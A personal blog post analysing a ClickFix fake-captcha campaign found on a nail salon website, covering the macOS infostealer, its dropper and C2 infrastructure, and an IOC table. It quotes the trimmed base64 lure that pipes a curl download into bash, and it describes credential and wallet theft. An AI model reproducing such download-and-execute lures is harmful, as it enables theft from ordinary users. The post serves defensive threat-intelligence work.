+++
title = "ClickFix 💅🏼"
description = "Soooo when I go to Spain, I like to treat myself. One thing in particular is to get my nails done. As I was preparing for my trip, I decided I’d book an appointment at the nail salon I usually go to. To my surprise, the website showed a weird page. Discovery (I can’t explain […]"
date = "2026-05-12T15:31:13Z"
url = "https://p0pcycle.com/2026/05/12/clickfix-%f0%9f%92%85%f0%9f%8f%bc/"
author = "P0pcycle"
text = ""
lastupdated = "2026-11-12T00:42:28.152978701Z"
seen = true
+++

1. [Discovery](https://p0pcycle.com/2026/05/12/clickfix-💅🏼/#discovery)
2. [The infrastructure](https://p0pcycle.com/2026/05/12/clickfix-💅🏼/#the-infrastructure)
3. [The dropper and the C2](https://p0pcycle.com/2026/05/12/clickfix-💅🏼/#the-dropper-and-the-c2)
4. [Probing (lightly)](https://p0pcycle.com/2026/05/12/clickfix-💅🏼/#probing-lightly)
5. [Conclusion](https://p0pcycle.com/2026/05/12/clickfix-💅🏼/#conclusion)
6. [IOC table](https://p0pcycle.com/2026/05/12/clickfix-💅🏼/#ioc-table)

Soooo when I go to Spain, I like to treat myself. One thing in particular is to get my nails done.

As I was preparing for my trip, I decided I’d book an appointment at the nail salon I usually go to. To my surprise, the website showed a weird page.

##### Discovery #####

*(I can’t explain why I took a photo with my phone instead of a screenshot… I panicked ok???)*

<img data-recalc-dims="1" loading="lazy" decoding="async" width="1024" height="687" data-attachment-id="1281" data-permalink="https://p0pcycle.com/2026/05/12/clickfix-%f0%9f%92%85%f0%9f%8f%bc/img_1193/" data-orig-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/IMG_1193.jpg?fit=1174%2C788&amp;ssl=1" data-orig-size="1174,788" data-comments-opened="1" data-image-meta="{&quot;orientation&quot;:&quot;1&quot;}" data-image-title="IMG_1193" data-image-description="" data-image-caption="" data-large-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/IMG_1193.jpg?fit=1024%2C687&amp;ssl=1" src="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/IMG_1193.jpg?resize=1024%2C687&amp;ssl=1" alt="" class="wp-image-1281" style="aspect-ratio:1.490552571278314;width:564px;height:auto" srcset="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/IMG_1193.jpg?resize=1024%2C687&amp;ssl=1 1024w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/IMG_1193.jpg?resize=300%2C201&amp;ssl=1 300w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/IMG_1193.jpg?resize=768%2C515&amp;ssl=1 768w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/IMG_1193.jpg?w=1174&amp;ssl=1 1174w" sizes="auto, (max-width: 1000px) 100vw, 1000px">The page has instructions to prove you are not a robot, and to paste a command in your terminal…

I had heard of this phishing method before, and I immediately recognized it was malicious. I got so excited that I could investigate this.

The third instruction saying to “copy the command” using the `copy` button makes a normal user think they are coping the ‘I am not a robot’ text.

Don’t be fooled! That is NOT the text you are copying. Also, that command makes no sense btw. If you actually copied what they suggest into your terminal you’d get:

```
command not found: I
```

Anyway, the real command you were copying is this (I’m trimming the command):

```
echo "Y3VybCAtc0wgIiQoZWNobyAnYmx[..]" | base64 -d | bash
```

“AH! INTERESTING”, I thought.

This decodes to a curl to another base64 encoded string:

```
curl -sL "$(echo 'aHR0c[..]' | base64-d)" | nohup bash
```

What’s happening here is they are downloading a file on your machine and executing it. That’s hella dangerous. You’d have NO idea if you weren’t in infosec or IT. But also, it happens so quickly, even if you did notice something weird, the script would start running.

The ***osascript*** that gets downloaded on your machine (and in particular for me, on MacOS) is an infostealer malware. It will steal browser passwords, cookies, crypto wallets, Keychain, Apple Notes, etc… It also spawns a dialog to trick the user into enter their password so they can run sudo commands.

It saves the password entered into \~/.pwd, so it can just read from that file whenever it performs privileged commands… silent re-infection.

<img data-recalc-dims="1" loading="lazy" decoding="async" width="1024" height="330" data-attachment-id="1296" data-permalink="https://p0pcycle.com/2026/05/12/clickfix-%f0%9f%92%85%f0%9f%8f%bc/image-132/" data-orig-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image.png?fit=1922%2C620&amp;ssl=1" data-orig-size="1922,620" data-comments-opened="1" data-image-title="image" data-image-description="" data-image-caption="" data-large-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image.png?fit=1024%2C330&amp;ssl=1" src="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image.png?resize=1024%2C330&amp;ssl=1" alt="" class="wp-image-1296" srcset="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image.png?resize=1024%2C330&amp;ssl=1 1024w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image.png?resize=300%2C97&amp;ssl=1 300w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image.png?resize=768%2C248&amp;ssl=1 768w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image.png?resize=1536%2C495&amp;ssl=1 1536w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image.png?resize=1200%2C387&amp;ssl=1 1200w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image.png?w=1922&amp;ssl=1 1922w" sizes="auto, (max-width: 1000px) 100vw, 1000px">First time I am exposed to osascript this is a hilarious scripting language

This was most definitely written with AI, I mean who in their right mind would…idk..?

Anyways, it zip’s it all up and sends it to another server.

<img data-recalc-dims="1" loading="lazy" decoding="async" width="1024" height="164" data-attachment-id="1300" data-permalink="https://p0pcycle.com/2026/05/12/clickfix-%f0%9f%92%85%f0%9f%8f%bc/image-133/" data-orig-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-1.png?fit=2316%2C370&amp;ssl=1" data-orig-size="2316,370" data-comments-opened="1" data-image-title="image" data-image-description="" data-image-caption="" data-large-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-1.png?fit=1024%2C164&amp;ssl=1" src="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-1.png?resize=1024%2C164&amp;ssl=1" alt="" class="wp-image-1300" srcset="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-1.png?resize=1024%2C164&amp;ssl=1 1024w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-1.png?resize=300%2C48&amp;ssl=1 300w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-1.png?resize=768%2C123&amp;ssl=1 768w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-1.png?resize=1536%2C245&amp;ssl=1 1536w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-1.png?resize=2048%2C327&amp;ssl=1 2048w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-1.png?resize=1200%2C192&amp;ssl=1 1200w" sizes="auto, (max-width: 1000px) 100vw, 1000px">

Also the “devs” weren’t quite done yet… still implementing a Ledger Live stealer, so they just commented it out.

<img data-recalc-dims="1" loading="lazy" decoding="async" width="1024" height="56" data-attachment-id="1303" data-permalink="https://p0pcycle.com/2026/05/12/clickfix-%f0%9f%92%85%f0%9f%8f%bc/image-134/" data-orig-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-2.png?fit=2138%2C116&amp;ssl=1" data-orig-size="2138,116" data-comments-opened="1" data-image-title="image" data-image-description="" data-image-caption="" data-large-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-2.png?fit=1024%2C56&amp;ssl=1" src="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-2.png?resize=1024%2C56&amp;ssl=1" alt="" class="wp-image-1303" srcset="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-2.png?resize=1024%2C56&amp;ssl=1 1024w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-2.png?resize=300%2C16&amp;ssl=1 300w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-2.png?resize=768%2C42&amp;ssl=1 768w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-2.png?resize=1536%2C83&amp;ssl=1 1536w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-2.png?resize=2048%2C111&amp;ssl=1 2048w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-2.png?resize=1200%2C65&amp;ssl=1 1200w" sizes="auto, (max-width: 1000px) 100vw, 1000px">

So to sum up, we have the **dropper** (the curl to the malicious website which hosts the osascript), and the **C2** (where our stolen info is sent to). Then, it deletes all traces.

Dropper: mekoilsuharum.com  
C2 server: uterimoxis.com

##### The infrastructure #####

Okay so I’m not used to doing threat intel and so on, so this is what I have regarding the empire.

The attackers split their operation across two continents. The dropper (the server that hosts the malware script) was hosted in Europe. The C2 server, which receives the stolen data, was hosted in the United States under a small ISP in Michigan.

<img data-recalc-dims="1" loading="lazy" decoding="async" width="964" height="1024" data-attachment-id="1317" data-permalink="https://p0pcycle.com/2026/05/12/clickfix-%f0%9f%92%85%f0%9f%8f%bc/image-136/" data-orig-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-4.png?fit=1163%2C1235&amp;ssl=1" data-orig-size="1163,1235" data-comments-opened="1" data-image-title="image" data-image-description="" data-image-caption="" data-large-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-4.png?fit=964%2C1024&amp;ssl=1" src="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-4.png?resize=964%2C1024&amp;ssl=1" alt="" class="wp-image-1317" srcset="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-4.png?resize=964%2C1024&amp;ssl=1 964w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-4.png?resize=283%2C300&amp;ssl=1 283w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-4.png?resize=768%2C816&amp;ssl=1 768w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/image-4.png?w=1163&amp;ssl=1 1163w" sizes="auto, (max-width: 964px) 100vw, 964px">Small rural ISP in Michigan, FENTOOOOOOOON

Both domains were registered through Njalla, an anonymous registrar incorporated in Nevis, a small Caribbean island nation with minimal legal cooperation agreements. Njalla accepts cryptocurrency payments, requires no identity verification, and legally acts as the owner of record for all domains registered through them.

However, I did notify them and they were very quick to respond. I haven’t heard anything back from them but I hope to believe they took care of it.

##### The dropper and the C2 #####

The dropper’s only job is to serve the malware script when a victim runs the curl command. It’s basically the delivery mechanism. The C2 is where the stolen data is zip’d and ship’d to.

They are independent by design. When the dropper was taken down, no new victims could be infected, but the C2 continued to collect data from machines that were already compromised.

As of writing, both the C2 and the dropper seem to be down (I might or not have had something to do with this ![🤷‍♀️](https://s.w.org/images/core/emoji/17.0.2/72x72/1f937-200d-2640-fe0f.png)).

##### Probing (lightly) #####

I kinda wanted to poke the bear and dig a bit deeper. To do this safely, I spun up a disposable DigitalOcean server.

I grabbed the authentication token from the osascript and attempted to make a POST request to the health endpoint */api/health*. The C2 responded with:

```
  {"data":null,"success":true}
```

The server was indeed alive, authenticated, and ready to receive stolen data from victims. I also got information on the stack: OpenResty sitting in front of a Node.js Express backend, running HTTP/2 over TLS 1.3 with a Let’s Encrypt certificate issued just weeks earlier on March 24, 2026. This was a fresh operation.

I tried to dig deeper: fuzzing the API for hidden endpoints, hunting for an admin panel, probing subdomains. Nothing.

They are pros. No guessable paths, randomised URLs, and a panel that either didn’t exist publicly or was locked to their IP only. Either that, or skill issue on my side (most probable).

##### Conclusion #####

I didn’t set out to investigate a malware campaign. I panicked, took a photo with my phone like a grandma, and then got completely sucked into a rabbit hole that ended with me poking a live C2 server from a disposable VM in the cloud while eating lunch.

But that’s kind of the point. This attack wasn’t targeting security researchers. It was targeting normal people, people booking nail appointments, people who happen to own crypto, people who would see a “prove you’re not a robot” prompt and not think twice. The command makes no sense if you look closely, but most people don’t look closely. That’s the whole bet.

The takeaway is simple: **never paste a command from a website into your terminal.** It doesn’t matter how legitimate the page looks. No website on earth needs you to open Terminal to prove you’re human.

For me personally, this was a first real dive into threat intelligence and active infrastructure analysis. I made mistakes, learned a lot, and got surprisingly far for someone who just wanted a manicure ![💅🏼](https://s.w.org/images/core/emoji/17.0.2/72x72/1f485-1f3fc.png).

The C2 is down now. The dropper is down. The nail salon is clean. And I got a fun set of nails.

<img data-recalc-dims="1" loading="lazy" decoding="async" width="1013" height="1024" data-attachment-id="1321" data-permalink="https://p0pcycle.com/2026/05/12/clickfix-%f0%9f%92%85%f0%9f%8f%bc/83692406-ffc5-44d9-9ccd-49a8e645895a/" data-orig-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/83692406-FFC5-44D9-9CCD-49A8E645895A-rotated.jpg?fit=2074%2C2096&amp;ssl=1" data-orig-size="2074,2096" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.2&quot;,&quot;camera&quot;:&quot;iPhone 14 Pro&quot;,&quot;created_timestamp&quot;:&quot;1777853167&quot;,&quot;focal_length&quot;:&quot;2.22&quot;,&quot;iso&quot;:&quot;2500&quot;,&quot;shutter_speed&quot;:&quot;0.02&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="83692406-FFC5-44D9-9CCD-49A8E645895A" data-image-description="" data-image-caption="" data-large-file="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/83692406-FFC5-44D9-9CCD-49A8E645895A-rotated.jpg?fit=1013%2C1024&amp;ssl=1" src="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/83692406-FFC5-44D9-9CCD-49A8E645895A.jpg?resize=1013%2C1024&amp;ssl=1" alt="" class="wp-image-1321" style="aspect-ratio:0.9895261845386534;width:284px;height:auto" srcset="https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/83692406-FFC5-44D9-9CCD-49A8E645895A-rotated.jpg?resize=1013%2C1024&amp;ssl=1 1013w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/83692406-FFC5-44D9-9CCD-49A8E645895A-rotated.jpg?resize=297%2C300&amp;ssl=1 297w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/83692406-FFC5-44D9-9CCD-49A8E645895A-rotated.jpg?resize=768%2C776&amp;ssl=1 768w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/83692406-FFC5-44D9-9CCD-49A8E645895A-rotated.jpg?resize=1520%2C1536&amp;ssl=1 1520w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/83692406-FFC5-44D9-9CCD-49A8E645895A-rotated.jpg?resize=2027%2C2048&amp;ssl=1 2027w, https://i0.wp.com/p0pcycle.com/wp-content/uploads/2026/05/83692406-FFC5-44D9-9CCD-49A8E645895A-rotated.jpg?resize=1200%2C1213&amp;ssl=1 1200w" sizes="auto, (max-width: 1000px) 100vw, 1000px">

##### IOC table #####

|  Domain   |           mekoilsuharum.com           |
|-----------|---------------------------------------|
|  Domain   |            uterimoxis.com             |
|  Domain   |          api.uterimoxis.com           |
|  Domain   |       gamma.api.uterimoxis.com        |
|    IP     |       213.177.179.52 (dropper)        |
|    IP     |         104.251.180.200` (C2)         |
|HTTP Header|X-Bid: f48fbe39836779cadbf148b5952919fd|
|   File    |            /tmp/alego.zip             |
|   File    |           /tmp/stravy/ggwp            |
|   File    |           /tmp/stravy/user            |
|   File    |         /tmp/stravy/hardware          |
|   File    |                \~/.pwd                |
| Directory |             /tmp/stravy/              |